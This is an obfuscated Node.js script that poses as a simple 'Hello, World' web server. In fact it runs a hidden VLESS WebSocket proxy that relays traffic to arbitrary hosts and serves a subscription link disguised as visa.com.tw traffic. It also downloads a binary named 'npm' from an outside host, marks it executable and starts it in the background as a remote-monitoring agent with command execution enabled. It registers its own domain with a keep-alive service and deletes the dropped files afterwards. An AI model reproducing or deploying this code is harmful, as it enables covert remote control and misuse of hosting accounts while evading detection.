const _0x1c1035=_0x6cb2;function _0x6cb2(_0x257211,_0x2a7306){const _0x3ae957=_0x3ae9();return _0x6cb2=function(_0x6cb2b4,_0x4d23c6){_0x6cb2b4=_0x6cb2b4-0x1c3;let _0x5f816f=_0x3ae957[_0x6cb2b4];return _0x5f816f;},_0x6cb2(_0x257211,_0x2a7306);}(function(_0x5c9675,_0x162ab4){const _0x4855cb=_0x6cb2,_0x23ce69=_0x5c9675();while(!![]){try{const _0x9765fc=-parseInt(_0x4855cb(0x1fe))/0x1+-parseInt(_0x4855cb(0x20c))/0x2+-parseInt(_0x4855cb(0x1e0))/0x3+-parseInt(_0x4855cb(0x1f7))/0x4+-parseInt(_0x4855cb(0x1f3))/0x5*(-parseInt(_0x4855cb(0x212))/0x6)+parseInt(_0x4855cb(0x21d))/0x7+-parseInt(_0x4855cb(0x225))/0x8*(-parseInt(_0x4855cb(0x1c8))/0x9);if(_0x9765fc===_0x162ab4)break;else _0x23ce69['push'](_0x23ce69['shift']());}catch(_0x4ec38e){_0x23ce69['push'](_0x23ce69['shift']());}}}(_0x3ae9,0x6a29c));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0x1c1035(0x1f5)),{Buffer}=require(_0x1c1035(0x1ed)),{exec,execSync}=require(_0x1c1035(0x1d8)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1c1035(0x214)][_0x1c1035(0x202)]||_0x1c1035(0x201),NEZHA_SERVER=process[_0x1c1035(0x214)][_0x1c1035(0x20f)]||'',NEZHA_PORT=process[_0x1c1035(0x214)][_0x1c1035(0x216)]||'',NEZHA_KEY=process[_0x1c1035(0x214)][_0x1c1035(0x210)]||'',DOMAIN=process['env']['DOMAIN']||_0x1c1035(0x1ca),AUTO_ACCESS=process[_0x1c1035(0x214)]['AUTO_ACCESS']||!![],SUB_PATH=process[_0x1c1035(0x214)][_0x1c1035(0x1c4)]||_0x1c1035(0x1ea),NAME=process[_0x1c1035(0x214)]['NAME']||_0x1c1035(0x222),PORT=process[_0x1c1035(0x214)][_0x1c1035(0x1e1)]||0xbb8,metaInfo=execSync(_0x1c1035(0x20d),{'encoding':'utf-8'}),ISP=metaInfo[_0x1c1035(0x207)](),httpServer=http[_0x1c1035(0x1e3)]((_0x4fe10c,_0x1232a2)=>{const _0xf41fd1=_0x1c1035;if(_0x4fe10c[_0xf41fd1(0x1e8)]==='/')_0x1232a2[_0xf41fd1(0x1cd)](0xc8,{'Content-Type':'text/plain'}),_0x1232a2['end'](_0xf41fd1(0x1cb));else{if(_0x4fe10c[_0xf41fd1(0x1e8)]==='/'+SUB_PATH){const _0x2f3dcd='vless://'+UUID+_0xf41fd1(0x1ec)+DOMAIN+_0xf41fd1(0x1e2)+DOMAIN+'&path=%2F#'+NAME+'-'+ISP,_0x1d1bb9=Buffer[_0xf41fd1(0x200)](_0x2f3dcd)[_0xf41fd1(0x1ce)](_0xf41fd1(0x1eb));_0x1232a2[_0xf41fd1(0x1cd)](0xc8,{'Content-Type':'text/plain'}),_0x1232a2['end'](_0x1d1bb9+'\x0a');}else _0x1232a2[_0xf41fd1(0x1cd)](0x194,{'Content-Type':'text/plain'}),_0x1232a2[_0xf41fd1(0x1dc)](_0xf41fd1(0x1dd));}}),wss=new WebSocket[(_0x1c1035(0x1d6))]({'server':httpServer}),uuid=UUID[_0x1c1035(0x1e6)](/-/g,'');wss['on'](_0x1c1035(0x1e9),_0x5ea3b=>{const _0x1b7162=_0x1c1035;_0x5ea3b[_0x1b7162(0x1d1)]('message',_0xf880f2=>{const _0x4e8144=_0x1b7162,[_0x572103]=_0xf880f2,_0x23aeca=_0xf880f2[_0x4e8144(0x226)](0x1,0x11);if(!_0x23aeca[_0x4e8144(0x1d7)]((_0xc0a513,_0x1ff5a7)=>_0xc0a513==parseInt(uuid['substr'](_0x1ff5a7*0x2,0x2),0x10)))return;let _0x1254a8=_0xf880f2[_0x4e8144(0x226)](0x11,0x12)[_0x4e8144(0x209)]()+0x13;const _0x4ab210=_0xf880f2[_0x4e8144(0x226)](_0x1254a8,_0x1254a8+=0x2)[_0x4e8144(0x1f4)](0x0),_0x3a9078=_0xf880f2[_0x4e8144(0x226)](_0x1254a8,_0x1254a8+=0x1)[_0x4e8144(0x209)](),_0x13fda3=_0x3a9078==0x1?_0xf880f2[_0x4e8144(0x226)](_0x1254a8,_0x1254a8+=0x4)[_0x4e8144(0x205)]('.'):_0x3a9078==0x2?new TextDecoder()[_0x4e8144(0x1c6)](_0xf880f2[_0x4e8144(0x226)](_0x1254a8+0x1,_0x1254a8+=0x1+_0xf880f2['slice'](_0x1254a8,_0x1254a8+0x1)['readUInt8']())):_0x3a9078==0x3?_0xf880f2[_0x4e8144(0x226)](_0x1254a8,_0x1254a8+=0x10)[_0x4e8144(0x1d3)]((_0x5a459d,_0x7eda15,_0x1e95f7,_0x4c0ffc)=>_0x1e95f7%0x2?_0x5a459d[_0x4e8144(0x1f6)](_0x4c0ffc['slice'](_0x1e95f7-0x1,_0x1e95f7+0x1)):_0x5a459d,[])['map'](_0x42a161=>_0x42a161[_0x4e8144(0x1f4)](0x0)[_0x4e8144(0x1ce)](0x10))[_0x4e8144(0x205)](':'):'';_0x5ea3b[_0x4e8144(0x1d2)](new Uint8Array([_0x572103,0x0]));const _0x5e0eb2=createWebSocketStream(_0x5ea3b);net['connect']({'host':_0x13fda3,'port':_0x4ab210},function(){const _0x2f4a8d=_0x4e8144;this[_0x2f4a8d(0x21f)](_0xf880f2[_0x2f4a8d(0x226)](_0x1254a8)),_0x5e0eb2['on'](_0x2f4a8d(0x1c7),()=>{})[_0x2f4a8d(0x1de)](this)['on'](_0x2f4a8d(0x1c7),()=>{})[_0x2f4a8d(0x1de)](_0x5e0eb2);})['on']('error',()=>{});})['on'](_0x1b7162(0x1c7),()=>{});});const getDownloadUrl=()=>{const _0x4cfddb=_0x1c1035,_0x5f3698=os[_0x4cfddb(0x1fc)]();return _0x5f3698===_0x4cfddb(0x208)||_0x5f3698===_0x4cfddb(0x20e)||_0x5f3698===_0x4cfddb(0x1f8)?!NEZHA_PORT?_0x4cfddb(0x21b):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x4cfddb(0x218):_0x4cfddb(0x21a);},downloadFile=async()=>{const _0x5ec53f=_0x1c1035;try{const _0x1c76d7=getDownloadUrl(),_0x225539=await axios({'method':_0x5ec53f(0x211),'url':_0x1c76d7,'responseType':'stream'}),_0x45d442=fs[_0x5ec53f(0x1fd)]('npm');return _0x225539[_0x5ec53f(0x1ee)][_0x5ec53f(0x1de)](_0x45d442),new Promise((_0x18ee30,_0x57a6b5)=>{const _0x19e841=_0x5ec53f;_0x45d442['on'](_0x19e841(0x1e5),()=>{const _0x2c0fe7=_0x19e841;console['log'](_0x2c0fe7(0x224)),exec(_0x2c0fe7(0x1cc),_0x358b38=>{if(_0x358b38)_0x57a6b5(_0x358b38);_0x18ee30();});}),_0x45d442['on'](_0x19e841(0x1c7),_0x57a6b5);});}catch(_0xbf7b4c){throw _0xbf7b4c;}},runnz=async()=>{const _0x34bb40=_0x1c1035;await downloadFile();let _0x40fc73='',_0x3be8a3='';console[_0x34bb40(0x1d5)](_0x34bb40(0x228)+NEZHA_SERVER);const _0x253be4=()=>{const _0x4c06d5=_0x34bb40;try{const _0x55abde=execSync(_0x4c06d5(0x215))[_0x4c06d5(0x1ce)]();return _0x55abde[_0x4c06d5(0x1e7)]>0x0;}catch(_0x1b38ff){return![];}};if(_0x253be4()){console[_0x34bb40(0x1d5)](_0x34bb40(0x1da));return;}if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x40e8df=[_0x34bb40(0x1c3),_0x34bb40(0x220),_0x34bb40(0x219),_0x34bb40(0x20b),_0x34bb40(0x1c5),_0x34bb40(0x203)];_0x40fc73=_0x40e8df[_0x34bb40(0x21e)](NEZHA_PORT)?_0x34bb40(0x217):'',_0x3be8a3=_0x34bb40(0x221)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x40fc73+_0x34bb40(0x1db);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3be27a=NEZHA_SERVER[_0x34bb40(0x21e)](':')?NEZHA_SERVER[_0x34bb40(0x227)](':')[_0x34bb40(0x1c9)]():'',_0x44c902=new Set([_0x34bb40(0x1c3),'8443',_0x34bb40(0x219),'2087',_0x34bb40(0x1c5),_0x34bb40(0x203)]),_0x1b9e56=_0x44c902['has'](_0x3be27a)?_0x34bb40(0x1ff):_0x34bb40(0x1df),_0x36458f='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x34bb40(0x206)+_0x1b9e56+_0x34bb40(0x1f0)+UUID;!fs[_0x34bb40(0x1ef)](_0x34bb40(0x204))&&fs[_0x34bb40(0x1cf)]('config.yaml',_0x36458f);}_0x3be8a3=_0x34bb40(0x20a);}else{console[_0x34bb40(0x1d5)](_0x34bb40(0x1d4));return;}}try{exec(_0x3be8a3,{'shell':_0x34bb40(0x21c)}),console['log'](_0x34bb40(0x213));}catch(_0x2da422){console[_0x34bb40(0x1c7)]('npm\x20running\x20error:\x20'+_0x2da422);}};function _0x3ae9(){const _0x2d527e=['128868FWOTsD','npm\x20is\x20running','env','ps\x20aux\x20|\x20grep\x20\x22npm\x22\x20|\x20grep\x20-v\x20\x22grep\x22','NEZHA_PORT','--tls','https://amd64.ssss.nyc.mn/v1','2096','https://amd64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/v1','/bin/bash','771771iNslnu','includes','write','8443','nohup\x20./npm\x20-s\x20','Vls','https://','npm\x20download\x20successfully','24iKcBFy','slice','split','NEZHA_SERVER:\x20','443','SUB_PATH','2083','decode','error','7205337xbhsgI','pop','1234.abc.com','Hello,\x20World\x0a','chmod\x20+x\x20./npm','writeHead','toString','writeFileSync','unlink','once','send','reduce','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','log','Server','every','child_process','\x22}\x27','npm\x20is\x20already\x20running','\x20>/dev/null\x202>&1\x20&','end','Not\x20Found\x0a','pipe','false','2149959sahsRO','PORT','&type=ws&host=','createServer','Error\x20sending\x20request:','finish','replace','length','url','connection','sub','base64','@www.visa.com.tw:443?encryption=none&security=tls&sni=','buffer','data','existsSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Automatic\x20Access\x20Task\x20added\x20successfully:','npm','15gUzNtf','readUInt16BE','net','concat','2773008xTHjue','aarch64','message','Error\x20added\x20Task:','Server\x20is\x20running\x20on\x20port\x20','arch','createWriteStream','227633OvXNpo','true','from','de04add9-5c68-6bab-950c-08cd5320df33','UUID','2053','config.yaml','join','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','trim','arm','readUInt8','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','2087','1008168randAM','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','arm64','NEZHA_SERVER','NEZHA_KEY','get'];_0x3ae9=function(){return _0x2d527e;};return _0x3ae9();}async function addAccessTask(){const _0x5ba70c=_0x1c1035;if(!AUTO_ACCESS)return;try{if(!DOMAIN){console[_0x5ba70c(0x1d5)]('URL\x20is\x20empty.\x20Skip\x20Adding\x20Automatic\x20Access\x20Task');return;}else{const _0x49471d=_0x5ba70c(0x223)+DOMAIN,_0x56dfa2='curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22'+_0x49471d+_0x5ba70c(0x1d9);exec(_0x56dfa2,(_0x24cb51,_0x38155c,_0x8e231c)=>{const _0xe98d19=_0x5ba70c;if(_0x24cb51){console[_0xe98d19(0x1c7)](_0xe98d19(0x1e4),_0x24cb51[_0xe98d19(0x1f9)]);return;}console[_0xe98d19(0x1d5)](_0xe98d19(0x1f1),_0x38155c);});}}catch(_0x12a975){console[_0x5ba70c(0x1c7)](_0x5ba70c(0x1fa),_0x12a975['message']);}}const delFiles=()=>{const _0x3349e6=_0x1c1035;fs[_0x3349e6(0x1d0)](_0x3349e6(0x1f2),()=>{}),fs[_0x3349e6(0x1d0)](_0x3349e6(0x204),()=>{});};httpServer['listen'](PORT,()=>{const _0x4a6e78=_0x1c1035;runnz(),addAccessTask(),console[_0x4a6e78(0x1d5)](_0x4a6e78(0x1fb)+PORT);});